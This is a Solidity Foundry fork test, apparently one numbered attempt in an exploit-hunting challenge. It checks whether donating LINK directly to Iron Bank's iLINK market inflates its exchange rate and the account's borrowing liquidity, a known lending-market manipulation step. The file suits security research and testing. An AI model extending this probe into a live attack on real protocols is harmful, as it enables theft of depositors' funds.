// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Attempt44 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IComptrollerAttempt44 {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICErc20Like44 is IERC20Attempt44 {
    function mint(uint256 mintAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function totalSupply() external view returns (uint256);
}

/// @notice Hypothesis: direct donations into a low-float Iron Bank ERC20 market like iLINK
/// still increase exchange rate and account liquidity. If this fails on a standard ERC20
/// underlying as well, the live Iron Bank donation family is effectively closed.
contract Attempt44 is Test {
    uint256 internal constant FORK_BLOCK = 14_684_704;
    uint256 internal constant EXPECTED_CHAIN_ID = 2401;
    uint256 internal constant MINT_LINK = 1_000_000e18;
    uint256 internal constant DONATE_LINK = 100_000e18;

    IERC20Attempt44 internal constant LINK = IERC20Attempt44(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    ICErc20Like44 internal constant ILINK = ICErc20Like44(0xE7BFf2Da8A2f619c2586FB83938Fa56CE803aA16);
    IComptrollerAttempt44 internal constant COMPTROLLER = IComptrollerAttempt44(0xAB1c342C7bf5Ec5F02ADEA1c2270670bCa144CbB);

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);

        vm.label(address(LINK), "LINK");
        vm.label(address(ILINK), "iLINK");
        vm.label(address(COMPTROLLER), "IronBankComptroller");
    }

    function test_iLink_direct_donation_updates_collateral() public {
        deal(address(LINK), address(this), MINT_LINK + DONATE_LINK);

        console.log("CHAIN_ID:", block.chainid);
        console.log("FORK_BLOCK:", block.number);
        console.log("ILINK_CASH_BEFORE:", ILINK.getCash());
        console.log("ILINK_EXCHANGE_RATE_BEFORE:", ILINK.exchangeRateStored());

        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");

        require(LINK.approve(address(ILINK), type(uint256).max), "approve iLINK failed");
        require(ILINK.mint(MINT_LINK) == 0, "iLINK mint failed");

        address[] memory markets = new address[](1);
        markets[0] = address(ILINK);

        uint256[] memory enterResults = COMPTROLLER.enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enterMarkets failed");

        (, uint256 liquidityBefore,) = COMPTROLLER.getAccountLiquidity(address(this));
        uint256 cashAfterMint = ILINK.getCash();
        uint256 exchangeRateAfterMint = ILINK.exchangeRateStored();

        require(LINK.transfer(address(ILINK), DONATE_LINK), "LINK donation failed");
        uint256 exchangeRateAfterDonation = ILINK.exchangeRateCurrent();
        uint256 cashAfterDonation = ILINK.getCash();
        (, uint256 liquidityAfter,) = COMPTROLLER.getAccountLiquidity(address(this));

        console.log("ILINK_CASH_AFTER_MINT:", cashAfterMint);
        console.log("ILINK_EXCHANGE_RATE_AFTER_MINT:", exchangeRateAfterMint);
        console.log("LIQUIDITY_BEFORE_DONATION:", liquidityBefore);
        console.log("ILINK_CASH_AFTER_DONATION:", cashAfterDonation);
        console.log("ILINK_EXCHANGE_RATE_AFTER_DONATION:", exchangeRateAfterDonation);
        console.log("LIQUIDITY_AFTER_DONATION:", liquidityAfter);

        assertGt(cashAfterDonation, cashAfterMint, "direct LINK transfer did not change market cash");
        assertGt(exchangeRateAfterDonation, exchangeRateAfterMint, "exchange rate did not increase");
        assertGt(liquidityAfter, liquidityBefore, "account liquidity did not increase");
    }
}
